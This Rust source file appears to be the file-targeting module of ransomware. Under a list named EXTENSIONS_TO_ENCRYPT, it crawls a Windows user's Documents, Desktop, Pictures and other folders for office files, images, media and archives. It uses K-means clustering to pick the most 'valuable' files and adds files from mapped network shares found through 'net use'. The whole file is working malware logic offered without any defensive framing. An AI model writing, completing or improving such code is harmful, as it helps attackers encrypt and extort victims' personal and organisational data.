use walkdir::WalkDir;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{SystemTime, UNIX_EPOCH};
use linfa::prelude::*;
use linfa_clustering::KMeans;
use ndarray::Array2;
use std::fs;

static EXTENSIONS_TO_ENCRYPT: [&str; 15] = [
    "doc", "docx", "xls", "xlsx", "ppt", "pptx",
    "pdf", "jpg", "jpeg", "png", "txt",
    "mp3", "mp4", "zip", "rar"
];

static DIRECTORIES_TO_TARGET: [&str; 6] = [
    "Documents", "Pictures", "Desktop", "Downloads", "Music", "Videos"
];

#[derive(Debug)]
struct FileFeatures {
    path: PathBuf,
    size_mb: f32,
    days_since_access: f32,
    days_since_modified: f32,
    extension_score: f32,
    path_score: f32,
}

fn get_extension_score(ext: &str) -> f32 {
    match ext.to_ascii_lowercase().as_str() {
        "doc" | "docx" | "xls" | "xlsx" | "ppt" | "pptx" | "pdf" => 10.0,
        "jpg" | "jpeg" | "png" => 5.0,
        "txt" => 3.0,
        "mp3" | "mp4" => 4.0,
        "zip" | "rar" => 6.0,
        _ => 1.0,
    }
}

fn get_path_score(path: &Path) -> f32 {
    let path_str = path.to_string_lossy().to_lowercase();
    if path_str.contains("documents") || path_str.contains("desktop") {
        10.0
    } else if path_str.contains("pictures") || path_str.contains("downloads") {
        7.0
    } else if path_str.contains("music") || path_str.contains("videos") {
        5.0
    } else {
        1.0
    }
}

fn collect_file_features() -> Vec<FileFeatures> {
    let mut features = Vec::new();
    let user_profile = std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Public".to_string());

    for dir in DIRECTORIES_TO_TARGET.iter() {
        let path = Path::new(&user_profile).join(dir);
        if path.exists() {
            for entry in WalkDir::new(&path).follow_links(true).into_iter().filter_map(|e| e.ok()) {
                let path = entry.path().to_path_buf();
                if path.is_file() {
                    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                        if EXTENSIONS_TO_ENCRYPT.contains(&ext.to_ascii_lowercase().as_str()) {
                            if let Ok(metadata) = fs::metadata(&path) {
                                let size_mb = metadata.len() as f32 / (1024.0 * 1024.0);
                                let now = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs() as f32;
                                let access_time = metadata.accessed().unwrap_or(SystemTime::UNIX_EPOCH).duration_since(UNIX_EPOCH).unwrap().as_secs() as f32;
                                let modified_time = metadata.modified().unwrap_or(SystemTime::UNIX_EPOCH).duration_since(UNIX_EPOCH).unwrap().as_secs() as f32;
                                let days_since_access = (now - access_time) / (24.0 * 3600.0);
                                let days_since_modified = (now - modified_time) / (24.0 * 3600.0);
                                let extension_score = get_extension_score(ext);
                                let path_score = get_path_score(&path);

                                features.push(FileFeatures {
                                    path,
                                    size_mb,
                                    days_since_access,
                                    days_since_modified,
                                    extension_score,
                                    path_score,
                                });
                            }
                        }
                    }
                }
            }
        }
    }

    // Similarly for network shares, but simplified for brevity
    features
}

pub fn get_target_files() -> Vec<PathBuf> {
    let features = collect_file_features();
    if features.is_empty() {
        return Vec::new();
    }

    // Prepare data for ML
    let n_samples = features.len();
    let mut data = Array2::<f32>::zeros((n_samples, 5));
    for (i, f) in features.iter().enumerate() {
        data[[i, 0]] = f.size_mb;
        data[[i, 1]] = f.days_since_access;
        data[[i, 2]] = f.days_since_modified;
        data[[i, 3]] = f.extension_score;
        data[[i, 4]] = f.path_score;
    }

    let dataset = Dataset::from(data);

    // Use K-means to cluster files into 3 clusters
    let model = KMeans::params(3)
        .fit(&dataset)
        .expect("K-means fitting failed");

    let predictions = model.predict(&dataset);

    // Calculate average size per cluster to find the most valuable cluster
    let mut cluster_sizes: Vec<f32> = vec![0.0; 3];
    let mut cluster_counts: Vec<usize> = vec![0; 3];
    for (i, &cluster) in predictions.iter().enumerate() {
        cluster_sizes[cluster as usize] += features[i].size_mb;
        cluster_counts[cluster as usize] += 1;
    }

    let avg_sizes: Vec<f32> = cluster_sizes.iter().zip(&cluster_counts).map(|(&size, &count)| if count > 0 { size / count as f32 } else { 0.0 }).collect();

    // Find the cluster with highest average size (most valuable)
    let best_cluster = avg_sizes.iter().enumerate().max_by(|a, b| a.1.partial_cmp(b.1).unwrap()).unwrap().0;

    // Select files from the best cluster, but limit to top 1000 for efficiency
    let mut selected: Vec<PathBuf> = features.iter()
        .enumerate()
        .filter(|(i, _)| predictions[*i] as usize == best_cluster)
        .map(|(_, f)| f.path.clone())
        .take(1000)
        .collect();

    // Also include network shares if any
    if cfg!(windows) {
        if let Ok(output) = Command::new("net").args(&["use"]).output() {
            let net_use_output = String::from_utf8_lossy(&output.stdout);
            for line in net_use_output.lines() {
                if line.starts_with("OK") && line.contains("\\\\") {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let share_path = parts[2];
                        let path = Path::new(share_path);
                        if path.exists() {
                            for entry in WalkDir::new(path).follow_links(true).into_iter().filter_map(|e| e.ok()) {
                                let path = entry.path().to_path_buf();
                                if path.is_file() {
                                    if let Some(ext) = path.extension().and_then(|s| s.to_str()) {
                                        if EXTENSIONS_TO_ENCRYPT.contains(&ext.to_ascii_lowercase().as_str()) {
                                            selected.push(path);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    selected
}